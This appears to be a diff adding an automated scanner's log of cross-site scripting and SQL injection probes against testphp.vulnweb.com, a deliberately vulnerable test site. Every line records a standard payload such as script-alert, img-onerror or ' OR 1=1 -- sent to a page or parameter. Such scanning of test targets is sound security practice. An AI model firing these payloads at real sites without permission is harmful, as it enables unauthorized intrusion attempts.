@@ -1,0 +1,868 @@
+[2025-06-11 23:02:34] XSS at http://testphp.vulnweb.com using payload: <script>alert(1)</script>
+[2025-06-11 23:02:34] XSS at http://testphp.vulnweb.com using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:02:35] XSS at http://testphp.vulnweb.com using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:02:36] SQLi at http://testphp.vulnweb.com using payload: ' OR 1=1 --
+[2025-06-11 23:02:36] SQLi at http://testphp.vulnweb.com using payload: " OR "1"="1
+[2025-06-11 23:02:37] SQLi at http://testphp.vulnweb.com using payload: admin' --
+[2025-06-11 23:02:38] XSS at http://testphp.vulnweb.com/index.php using payload: <script>alert(1)</script>
+[2025-06-11 23:02:39] XSS at http://testphp.vulnweb.com/index.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:02:39] XSS at http://testphp.vulnweb.com/index.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:02:40] SQLi at http://testphp.vulnweb.com/index.php using payload: ' OR 1=1 --
+[2025-06-11 23:02:40] SQLi at http://testphp.vulnweb.com/index.php using payload: " OR "1"="1
+[2025-06-11 23:02:41] SQLi at http://testphp.vulnweb.com/index.php using payload: admin' --
+[2025-06-11 23:02:42] XSS at http://testphp.vulnweb.com/categories.php using payload: <script>alert(1)</script>
+[2025-06-11 23:02:42] XSS at http://testphp.vulnweb.com/categories.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:02:43] XSS at http://testphp.vulnweb.com/categories.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:02:43] SQLi at http://testphp.vulnweb.com/categories.php using payload: ' OR 1=1 --
+[2025-06-11 23:02:44] SQLi at http://testphp.vulnweb.com/categories.php using payload: " OR "1"="1
+[2025-06-11 23:02:44] SQLi at http://testphp.vulnweb.com/categories.php using payload: admin' --
+[2025-06-11 23:02:45] XSS at http://testphp.vulnweb.com/artists.php using payload: <script>alert(1)</script>
+[2025-06-11 23:02:46] XSS at http://testphp.vulnweb.com/artists.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:02:47] XSS at http://testphp.vulnweb.com/artists.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:02:47] SQLi at http://testphp.vulnweb.com/artists.php using payload: ' OR 1=1 --
+[2025-06-11 23:02:48] SQLi at http://testphp.vulnweb.com/artists.php using payload: " OR "1"="1
+[2025-06-11 23:02:48] SQLi at http://testphp.vulnweb.com/artists.php using payload: admin' --
+[2025-06-11 23:02:49] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: <script>alert(1)</script>
+[2025-06-11 23:02:50] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:02:50] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:02:51] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: ' OR 1=1 --
+[2025-06-11 23:02:51] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: " OR "1"="1
+[2025-06-11 23:02:52] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: admin' --
+[2025-06-11 23:02:53] XSS at http://testphp.vulnweb.com/cart.php using payload: <script>alert(1)</script>
+[2025-06-11 23:02:54] XSS at http://testphp.vulnweb.com/cart.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:02:54] XSS at http://testphp.vulnweb.com/cart.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:02:55] SQLi at http://testphp.vulnweb.com/cart.php using payload: ' OR 1=1 --
+[2025-06-11 23:02:55] SQLi at http://testphp.vulnweb.com/cart.php using payload: " OR "1"="1
+[2025-06-11 23:02:56] SQLi at http://testphp.vulnweb.com/cart.php using payload: admin' --
+[2025-06-11 23:02:57] XSS at http://testphp.vulnweb.com/guestbook.php using payload: <script>alert(1)</script>
+[2025-06-11 23:02:57] XSS at http://testphp.vulnweb.com/guestbook.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:02:58] XSS at http://testphp.vulnweb.com/guestbook.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:02:58] XSS at http://testphp.vulnweb.com/guestbook.php using payload: <script>alert(1)</script>
+[2025-06-11 23:02:59] XSS at http://testphp.vulnweb.com/guestbook.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:02:59] XSS at http://testphp.vulnweb.com/guestbook.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:03:00] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: ' OR 1=1 --
+[2025-06-11 23:03:00] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: " OR "1"="1
+[2025-06-11 23:03:01] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: admin' --
+[2025-06-11 23:03:02] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: ' OR 1=1 --
+[2025-06-11 23:03:02] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: " OR "1"="1
+[2025-06-11 23:03:03] SQLi at http://testphp.vulnweb.com/guestbook.php using payload: admin' --
+[2025-06-11 23:03:06] XSS at http://testphp.vulnweb.com/login.php using payload: <script>alert(1)</script>
+[2025-06-11 23:03:07] XSS at http://testphp.vulnweb.com/login.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:03:07] XSS at http://testphp.vulnweb.com/login.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:03:08] SQLi at http://testphp.vulnweb.com/login.php using payload: ' OR 1=1 --
+[2025-06-11 23:03:09] SQLi at http://testphp.vulnweb.com/login.php using payload: " OR "1"="1
+[2025-06-11 23:03:09] SQLi at http://testphp.vulnweb.com/login.php using payload: admin' --
+[2025-06-11 23:03:10] SQLi at http://testphp.vulnweb.com/login.php using payload: ' OR 1=1 --
+[2025-06-11 23:03:10] SQLi at http://testphp.vulnweb.com/login.php using payload: " OR "1"="1
+[2025-06-11 23:03:11] SQLi at http://testphp.vulnweb.com/login.php using payload: admin' --
+[2025-06-11 23:03:12] XSS at http://testphp.vulnweb.com/signup.php using payload: <script>alert(1)</script>
+[2025-06-11 23:03:12] XSS at http://testphp.vulnweb.com/signup.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:03:13] XSS at http://testphp.vulnweb.com/signup.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:03:13] XSS at http://testphp.vulnweb.com/signup.php using payload: <script>alert(1)</script>
+[2025-06-11 23:03:14] XSS at http://testphp.vulnweb.com/signup.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:03:15] XSS at http://testphp.vulnweb.com/signup.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:03:15] SQLi at http://testphp.vulnweb.com/signup.php using payload: ' OR 1=1 --
+[2025-06-11 23:03:16] SQLi at http://testphp.vulnweb.com/signup.php using payload: admin' --
+[2025-06-11 23:03:17] SQLi at http://testphp.vulnweb.com/signup.php using payload: ' OR 1=1 --
+[2025-06-11 23:03:17] SQLi at http://testphp.vulnweb.com/signup.php using payload: " OR "1"="1
+[2025-06-11 23:03:18] SQLi at http://testphp.vulnweb.com/signup.php using payload: admin' --
+[2025-06-11 23:03:21] XSS at http://testphp.vulnweb.com/userinfo.php using payload: <script>alert(1)</script>
+[2025-06-11 23:03:22] XSS at http://testphp.vulnweb.com/userinfo.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:03:22] XSS at http://testphp.vulnweb.com/userinfo.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:03:23] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: ' OR 1=1 --
+[2025-06-11 23:03:24] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: " OR "1"="1
+[2025-06-11 23:03:24] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: admin' --
+[2025-06-11 23:03:25] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: ' OR 1=1 --
+[2025-06-11 23:03:25] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: " OR "1"="1
+[2025-06-11 23:03:26] SQLi at http://testphp.vulnweb.com/userinfo.php using payload: admin' --
+[2025-06-11 23:03:27] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:03:28] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:03:28] XSS at http://testphp.vulnweb.com/artists.php?artist=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:03:29] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: ' OR 1=1 --
+[2025-06-11 23:03:30] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: " OR "1"="1
+[2025-06-11 23:03:30] SQLi at http://testphp.vulnweb.com/artists.php?artist=1 using payload: admin' --
+[2025-06-11 23:03:31] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:03:32] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:03:32] XSS at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:03:33] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: ' OR 1=1 --
+[2025-06-11 23:03:33] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: " OR "1"="1
+[2025-06-11 23:03:34] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=1 using payload: admin' --
+[2025-06-11 23:03:36] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:03:37] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:03:38] XSS at http://testphp.vulnweb.com/product.php?pic=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:03:38] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: ' OR 1=1 --
+[2025-06-11 23:03:39] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: " OR "1"="1
+[2025-06-11 23:03:39] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: admin' --
+[2025-06-11 23:03:40] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: ' OR 1=1 --
+[2025-06-11 23:03:40] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: " OR "1"="1
+[2025-06-11 23:03:41] SQLi at http://testphp.vulnweb.com/product.php?pic=1 using payload: admin' --
+[2025-06-11 23:03:44] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:03:44] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:03:45] XSS at http://testphp.vulnweb.com/product.php?pic=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:03:46] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: ' OR 1=1 --
+[2025-06-11 23:03:46] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: " OR "1"="1
+[2025-06-11 23:03:47] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: admin' --
+[2025-06-11 23:03:47] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: ' OR 1=1 --
+[2025-06-11 23:03:48] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: " OR "1"="1
+[2025-06-11 23:03:48] SQLi at http://testphp.vulnweb.com/product.php?pic=2 using payload: admin' --
+[2025-06-11 23:03:51] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:03:52] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:03:52] XSS at http://testphp.vulnweb.com/product.php?pic=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:03:53] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: ' OR 1=1 --
+[2025-06-11 23:03:54] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: " OR "1"="1
+[2025-06-11 23:03:54] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: admin' --
+[2025-06-11 23:03:55] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: ' OR 1=1 --
+[2025-06-11 23:03:55] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: " OR "1"="1
+[2025-06-11 23:03:56] SQLi at http://testphp.vulnweb.com/product.php?pic=3 using payload: admin' --
+[2025-06-11 23:03:59] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: <script>alert(1)</script>
+[2025-06-11 23:03:59] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:00] XSS at http://testphp.vulnweb.com/product.php?pic=4 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:00] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: ' OR 1=1 --
+[2025-06-11 23:04:01] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: " OR "1"="1
+[2025-06-11 23:04:01] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: admin' --
+[2025-06-11 23:04:02] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: ' OR 1=1 --
+[2025-06-11 23:04:02] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: " OR "1"="1
+[2025-06-11 23:04:03] SQLi at http://testphp.vulnweb.com/product.php?pic=4 using payload: admin' --
+[2025-06-11 23:04:06] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:07] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:08] XSS at http://testphp.vulnweb.com/product.php?pic=5 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:08] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: ' OR 1=1 --
+[2025-06-11 23:04:09] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: " OR "1"="1
+[2025-06-11 23:04:09] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: admin' --
+[2025-06-11 23:04:10] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: ' OR 1=1 --
+[2025-06-11 23:04:10] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: " OR "1"="1
+[2025-06-11 23:04:11] SQLi at http://testphp.vulnweb.com/product.php?pic=5 using payload: admin' --
+[2025-06-11 23:04:14] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:14] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:15] XSS at http://testphp.vulnweb.com/product.php?pic=6 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:16] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: ' OR 1=1 --
+[2025-06-11 23:04:16] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: " OR "1"="1
+[2025-06-11 23:04:17] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: admin' --
+[2025-06-11 23:04:17] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: ' OR 1=1 --
+[2025-06-11 23:04:18] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: " OR "1"="1
+[2025-06-11 23:04:18] SQLi at http://testphp.vulnweb.com/product.php?pic=6 using payload: admin' --
+[2025-06-11 23:04:20] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:20] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:21] XSS at http://testphp.vulnweb.com/artists.php?artist=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:21] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: ' OR 1=1 --
+[2025-06-11 23:04:22] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: " OR "1"="1
+[2025-06-11 23:04:22] SQLi at http://testphp.vulnweb.com/artists.php?artist=2 using payload: admin' --
+[2025-06-11 23:04:23] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:24] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:25] XSS at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:25] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: ' OR 1=1 --
+[2025-06-11 23:04:26] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: " OR "1"="1
+[2025-06-11 23:04:26] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=2 using payload: admin' --
+[2025-06-11 23:04:29] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:29] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:30] XSS at http://testphp.vulnweb.com/product.php?pic=7 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:30] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: ' OR 1=1 --
+[2025-06-11 23:04:31] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: " OR "1"="1
+[2025-06-11 23:04:31] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: admin' --
+[2025-06-11 23:04:32] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: ' OR 1=1 --
+[2025-06-11 23:04:33] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: " OR "1"="1
+[2025-06-11 23:04:33] SQLi at http://testphp.vulnweb.com/product.php?pic=7 using payload: admin' --
+[2025-06-11 23:04:35] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:36] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:36] XSS at http://testphp.vulnweb.com/artists.php?artist=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:37] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: ' OR 1=1 --
+[2025-06-11 23:04:37] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: " OR "1"="1
+[2025-06-11 23:04:38] SQLi at http://testphp.vulnweb.com/artists.php?artist=3 using payload: admin' --
+[2025-06-11 23:04:39] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:39] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:40] XSS at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:40] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: ' OR 1=1 --
+[2025-06-11 23:04:41] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: " OR "1"="1
+[2025-06-11 23:04:41] SQLi at http://testphp.vulnweb.com/listproducts.php?artist=3 using payload: admin' --
+[2025-06-11 23:04:43] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:43] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:44] XSS at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:44] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: ' OR 1=1 --
+[2025-06-11 23:04:45] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: " OR "1"="1
+[2025-06-11 23:04:45] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=1 using payload: admin' --
+[2025-06-11 23:04:46] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:47] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:47] XSS at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:48] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: ' OR 1=1 --
+[2025-06-11 23:04:48] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: " OR "1"="1
+[2025-06-11 23:04:49] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=2 using payload: admin' --
+[2025-06-11 23:04:50] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:51] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:51] XSS at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:52] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: ' OR 1=1 --
+[2025-06-11 23:04:52] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: " OR "1"="1
+[2025-06-11 23:04:53] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=3 using payload: admin' --
+[2025-06-11 23:04:54] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: <script>alert(1)</script>
+[2025-06-11 23:04:54] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:04:55] XSS at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:04:55] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: ' OR 1=1 --
+[2025-06-11 23:04:56] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: " OR "1"="1
+[2025-06-11 23:04:56] SQLi at http://testphp.vulnweb.com/listproducts.php?cat=4 using payload: admin' --
+[2025-06-11 23:17:40] XSS at http://testphp.vulnweb.com using payload: <script>alert(1)</script>
+[2025-06-11 23:17:40] XSS at http://testphp.vulnweb.com using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:41] XSS at http://testphp.vulnweb.com using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:41] SQLi at http://testphp.vulnweb.com using payload: ' OR 1=1 --
+[2025-06-11 23:17:42] SQLi at http://testphp.vulnweb.com using payload: " OR "1"="1
+[2025-06-11 23:17:42] SQLi at http://testphp.vulnweb.com using payload: admin' --
+[2025-06-11 23:17:43] XSS at http://testphp.vulnweb.com using payload: <script>alert(1)</script>
+[2025-06-11 23:17:43] XSS at http://testphp.vulnweb.com/index.php using payload: <script>alert(1)</script>
+[2025-06-11 23:17:44] XSS at http://testphp.vulnweb.com using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:44] XSS at http://testphp.vulnweb.com/index.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:44] XSS at http://testphp.vulnweb.com using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:44] XSS at http://testphp.vulnweb.com/index.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:45] SQLi at http://testphp.vulnweb.com using payload: ' OR 1=1 --
+[2025-06-11 23:17:45] SQLi at http://testphp.vulnweb.com/index.php using payload: ' OR 1=1 --
+[2025-06-11 23:17:45] SQLi at http://testphp.vulnweb.com using payload: " OR "1"="1
+[2025-06-11 23:17:46] SQLi at http://testphp.vulnweb.com/index.php using payload: " OR "1"="1
+[2025-06-11 23:17:46] SQLi at http://testphp.vulnweb.com using payload: admin' --
+[2025-06-11 23:17:46] SQLi at http://testphp.vulnweb.com/index.php using payload: admin' --
+[2025-06-11 23:17:47] XSS at http://testphp.vulnweb.com/index.php using payload: <script>alert(1)</script>
+[2025-06-11 23:17:47] XSS at http://testphp.vulnweb.com/categories.php using payload: <script>alert(1)</script>
+[2025-06-11 23:17:47] XSS at http://testphp.vulnweb.com/index.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:48] XSS at http://testphp.vulnweb.com/categories.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:48] XSS at http://testphp.vulnweb.com/index.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:48] XSS at http://testphp.vulnweb.com/categories.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:48] SQLi at http://testphp.vulnweb.com/index.php using payload: ' OR 1=1 --
+[2025-06-11 23:17:49] SQLi at http://testphp.vulnweb.com/categories.php using payload: ' OR 1=1 --
+[2025-06-11 23:17:49] SQLi at http://testphp.vulnweb.com/index.php using payload: " OR "1"="1
+[2025-06-11 23:17:49] SQLi at http://testphp.vulnweb.com/categories.php using payload: " OR "1"="1
+[2025-06-11 23:17:49] SQLi at http://testphp.vulnweb.com/index.php using payload: admin' --
+[2025-06-11 23:17:50] SQLi at http://testphp.vulnweb.com/categories.php using payload: admin' --
+[2025-06-11 23:17:51] XSS at http://testphp.vulnweb.com/categories.php using payload: <script>alert(1)</script>
+[2025-06-11 23:17:51] XSS at http://testphp.vulnweb.com/artists.php using payload: <script>alert(1)</script>
+[2025-06-11 23:17:51] XSS at http://testphp.vulnweb.com/categories.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:51] XSS at http://testphp.vulnweb.com/artists.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:52] XSS at http://testphp.vulnweb.com/categories.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:52] XSS at http://testphp.vulnweb.com/artists.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:52] SQLi at http://testphp.vulnweb.com/categories.php using payload: ' OR 1=1 --
+[2025-06-11 23:17:52] SQLi at http://testphp.vulnweb.com/artists.php using payload: ' OR 1=1 --
+[2025-06-11 23:17:53] SQLi at http://testphp.vulnweb.com/categories.php using payload: " OR "1"="1
+[2025-06-11 23:17:53] SQLi at http://testphp.vulnweb.com/artists.php using payload: " OR "1"="1
+[2025-06-11 23:17:53] SQLi at http://testphp.vulnweb.com/categories.php using payload: admin' --
+[2025-06-11 23:17:53] SQLi at http://testphp.vulnweb.com/artists.php using payload: admin' --
+[2025-06-11 23:17:54] XSS at http://testphp.vulnweb.com/artists.php using payload: <script>alert(1)</script>
+[2025-06-11 23:17:54] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: <script>alert(1)</script>
+[2025-06-11 23:17:55] XSS at http://testphp.vulnweb.com/artists.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:55] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:55] XSS at http://testphp.vulnweb.com/artists.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:56] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:56] SQLi at http://testphp.vulnweb.com/artists.php using payload: ' OR 1=1 --
+[2025-06-11 23:17:56] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: ' OR 1=1 --
+[2025-06-11 23:17:56] SQLi at http://testphp.vulnweb.com/artists.php using payload: " OR "1"="1
+[2025-06-11 23:17:57] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: " OR "1"="1
+[2025-06-11 23:17:57] SQLi at http://testphp.vulnweb.com/artists.php using payload: admin' --
+[2025-06-11 23:17:57] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: admin' --
+[2025-06-11 23:17:58] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: <script>alert(1)</script>
+[2025-06-11 23:17:58] XSS at http://testphp.vulnweb.com/cart.php using payload: <script>alert(1)</script>
+[2025-06-11 23:17:58] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:59] XSS at http://testphp.vulnweb.com/cart.php using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:17:59] XSS at http://testphp.vulnweb.com/disclaimer.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:59] XSS at http://testphp.vulnweb.com/cart.php using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:17:59] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: ' OR 1=1 --
+[2025-06-11 23:17:59] XSS at http://testphp.vulnweb.com using payload: <script>alert(1)</script>
+[2025-06-11 23:18:00] SQLi at http://testphp.vulnweb.com/cart.php using payload: ' OR 1=1 --
+[2025-06-11 23:18:00] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: " OR "1"="1
+[2025-06-11 23:18:00] XSS at http://testphp.vulnweb.com using payload: "><svg/onload=alert(1)>
+[2025-06-11 23:18:00] SQLi at http://testphp.vulnweb.com/cart.php using payload: " OR "1"="1
+[2025-06-11 23:18:00] SQLi at http://testphp.vulnweb.com/disclaimer.php using payload: admin' --
+[2025-06-11 23:18:01] XSS at http://testphp.vulnweb.com using payload: '"><img src=x onerror=alert(1)>
+[2025-06-11 23:18:01] SQLi at http://testphp.vulnweb.com/cart.php using payload: admin' --
